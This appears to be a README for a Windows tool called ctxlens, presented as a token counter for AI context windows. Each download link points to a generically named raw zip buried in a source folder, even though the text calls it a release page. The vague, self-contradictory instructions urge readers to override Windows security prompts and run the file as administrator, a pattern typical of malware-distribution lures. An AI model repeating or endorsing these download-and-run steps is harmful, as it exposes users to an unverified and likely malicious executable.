# 🧰 ctxlens - See Token Use Before You Run

[![Download ctxlens](https://img.shields.io/badge/Download%20ctxlens-blue-grey)](https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip)

## 📦 What it does

ctxlens is a token budget analyzer for AI context windows. It helps you check how much room you have left before you send text to tools like Claude, GPT, Gemini, or Grok.

It works like `du` for tokens. You point it at text or a code folder, and it shows token use in a simple way. That helps you avoid sending too much content at once.

## 🖥️ What you need

- Windows 10 or Windows 11
- A normal internet connection for the first download
- A file unzip tool if the download comes as a `.zip` file
- Access to the folder or text you want to check

You do not need to set up a coding tool or install a package manager.

## ⬇️ Download ctxlens

Visit this page to download the Windows file:

[https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip](https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip)

On that page, look for the latest release and choose the Windows download file. If there are several files, pick the one that matches your system.

## 🪟 Install on Windows

1. Open the releases page.
2. Download the Windows file.
3. If the file is a `.zip`, right-click it and choose **Extract All**.
4. Open the extracted folder.
5. Find the `ctxlens` app file.
6. Double-click it to run.

If Windows shows a security prompt, choose the option that lets you run the file.

## 🚀 First run

When you start ctxlens, it opens a simple command window or app window. From there, you can check token use for a file, folder, or pasted text.

A common use looks like this:

- Check one file before you paste it into an AI chat
- Check a project folder before you send code to an AI tool
- Compare different files to see which one uses more tokens
- Keep your prompt within the model limit

## 📁 Typical use cases

### 👨‍💻 Code review
Use ctxlens to see how many tokens your source files use before you send them to an AI model for review.

### 🗂️ Folder checks
Point it at a folder and see the token cost of all files inside. This helps when you want to send a codebase or a docs set to an AI tool.

### 💬 Prompt planning
Paste long text into ctxlens first so you can trim it before it hits the context window.

### 🔍 Model fit
Use it to check whether your content fits a smaller or larger model context window.

## 🧭 How to use it

Most users follow this flow:

1. Open ctxlens.
2. Choose the file or folder you want to check.
3. Run the scan.
4. Read the token count.
5. Remove extra text if the count is too high.
6. Send the smaller version to your AI tool.

If the app accepts drag and drop, you can drop a file or folder into the window. If it uses a command line, you can type the path to the item you want to scan.

## 🧠 What the results mean

ctxlens gives you a token count. Tokens are chunks of text that AI models read.

A higher token count means:

- more of the context window is used
- less room remains for your question and the reply
- the model may miss part of the input if it goes over the limit

A lower token count means:

- more space stays free
- your prompt is easier to manage
- you can add more instructions or files

## 🧰 Common file types

ctxlens can help with:

- `.txt`
- `.md`
- `.json`
- `.py`
- `.js`
- `.ts`
- `.go`
- `.rs`
- `.java`
- `.cpp`
- `.cs`

It can also work with mixed code folders, which is useful when you want to check a full project.

## ⚙️ How to get the best result

- Start with one file before you scan a full folder
- Remove files you do not need
- Keep only the code or text that matters
- Check large docs before sending them to an AI assistant
- Use it again after edits so you know your new token count

## 🧪 Example workflow

If you want help with a bug in your app:

1. Pick the main source file.
2. Add the related config file.
3. Scan both with ctxlens.
4. If the count is too high, remove tests, logs, or long comments.
5. Send the smaller set to your AI tool.

This makes it easier to stay within the context window and keep the important parts in view.

## 🔧 If the app does not open

Try these steps:

1. Download the file again from the releases page.
2. Make sure the download finished.
3. Extract the archive if it came in a `.zip`.
4. Right-click the app and choose **Run as administrator**.
5. Check that Windows did not block the file.
6. Move the folder to a simple path like `C:\ctxlens\`

## 🗃️ If you want to scan a folder

Use a folder with a clear set of files. Good examples:

- a single app module
- a docs folder
- a prompt draft folder
- a config set for one project

Skip folders with large build files or media files if you only want token counts for text code files.

## 🧩 Why this helps

AI tools have context limits. When your input is too large, you may lose part of the content or need to trim it by hand. ctxlens gives you a quick way to see the size first, so you can plan what to send.

That saves time and keeps your prompts more focused.

## 📌 Related topics

ai, claude, cli, code-analysis, context-window, developer-tools, gemini, gpt, grok, llm, tokenizer, tokens

## 🧾 Basic file layout

A typical release may include:

- the main Windows app file
- a readme file
- a license file
- support files needed to run the app

Keep all files in the same folder after you extract them.

## 🛠️ Short tips for Windows users

- Use a folder you can find again, like `Downloads` or `Desktop`
- Do not rename files unless you know the app still works with the new name
- Keep the whole extracted folder together
- If a scan seems slow, try a smaller folder first
- Close other large apps if your system feels slow

## 🔗 Download again if needed

If you need the Windows file again, use the release page:

[https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip](https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip)